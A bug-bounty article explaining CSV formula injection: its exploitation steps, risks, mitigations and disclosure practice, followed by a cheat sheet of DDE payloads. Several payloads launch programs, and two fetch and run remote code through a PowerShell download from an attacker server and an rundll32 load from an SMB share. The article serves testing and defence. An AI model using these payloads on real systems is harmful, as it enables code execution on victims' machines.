# CSV Injection

# Introduction:
In the realm of bug bounty hunting, security researchers actively seek vulnerabilities in software systems to help organizations identify and fix potential threats. One such vulnerability that has gained significant attention is CSV (Comma-Separated Values) injection. This article aims to provide a comprehensive understanding of CSV injection, its risks, and effective countermeasures, empowering bug bounty hunters and developers alike to mitigate this security concern effectively.

## Understanding CSV Injection:
CSV injection, also known as formula injection or data injection, occurs when an attacker manipulates the content of a CSV file to execute malicious commands. CSV files are commonly used to store and exchange data between different systems, such as spreadsheets, databases, and web applications. The primary cause of this vulnerability is the mishandling of user-supplied data in CSV fields that are processed by spreadsheet applications.

### Exploitation Process:

Identifying vulnerable applications: Start by identifying web applications that accept user input and generate CSV files dynamically.
Crafting a malicious payload: Construct a CSV file with cells that contain specific content capable of triggering formula execution within spreadsheet applications.
Injecting the payload: Submit the crafted CSV file to the target application, typically by uploading or importing it.
Execution of malicious formulas: If the application processes the CSV file without proper validation or sanitization, the formulas within the cells can execute arbitrary commands, leading to various security risks.
#### Risks Associated with CSV Injection:

Remote Code Execution: Successful CSV injection attacks can allow remote code execution on the target system, enabling an attacker to execute arbitrary commands with the privileges of the affected application.
Data Exfiltration: Attackers can exploit CSV injection to extract sensitive data stored in the target system, potentially leading to data breaches and privacy violations.
Denial of Service: By injecting malicious formulas into CSV files, an attacker can cause spreadsheet applications to consume excessive system resources, leading to denial-of-service conditions.

### Mitigation Strategies:

Input Validation and Sanitization: Implement robust input validation and sanitization techniques to prevent malicious data from being stored or processed within CSV files.
Strict Content-Type Handling: Set appropriate Content-Type headers to ensure that files uploaded or imported by the application are interpreted as CSV files and not as executable code.
Avoiding Dynamic Formulas: Avoid the use of dynamic formulas within CSV files, especially when user-supplied data is involved.
Content Disposition and File Naming: Provide meaningful and secure names for CSV files and set the appropriate Content-Disposition headers to prevent malicious content from being executed inadvertently.
Education and Awareness: Educate developers, system administrators, and end-users about the risks associated with CSV injection and the best practices to mitigate them.

### Reporting and Responsible Disclosure:
If you discover CSV injection vulnerabilities during your bug bounty hunting activities, it is crucial to follow responsible disclosure practices. Notify the affected organization or platform about the vulnerability promptly, providing detailed information on how to reproduce the issue and potential mitigations. Allow the organization sufficient time to address the vulnerability before disclosing it publicly.

# Conclusion:
CSV injection presents a significant risk in web applications that handle CSV files. Bug bounty hunters play a crucial role in identifying and reporting these vulnerabilities, enabling organizations to enhance their security posture. By understanding the risks associated with CSV injection and adopting effective countermeasures, both security researchers and developers can collaborate to mitigate this threat, ensuring the integrity and security of web applications that process CSV files.




### Tutorials for CSV Injection
* [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) - A pretty good overview by OWASP
* [Google CSV Formula Injection](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection) - An overview by Google
* [Your Spreadsheets are Not Safe](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection) - A great article on CSV Injection
* [Three New DDE Obfuscation Methods](https://www.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation) - An article explaining DDE and CSV Injection


### Payloads for CSV Injection

**Basic Exploit with Dynamic Data Exchange**
```
# pop a calc
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0

# pop a notepad
=cmd|' /C notepad'!'A1'

# powershell download and execute
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

# msf smb delivery with rundll32
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

# Prefix obfuscation and command chaining
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+thespanishinquisition(cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A

# Using rundll32 instead of cmd
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A

# Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A


```

**Other Payloads**

```
=DDE("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

```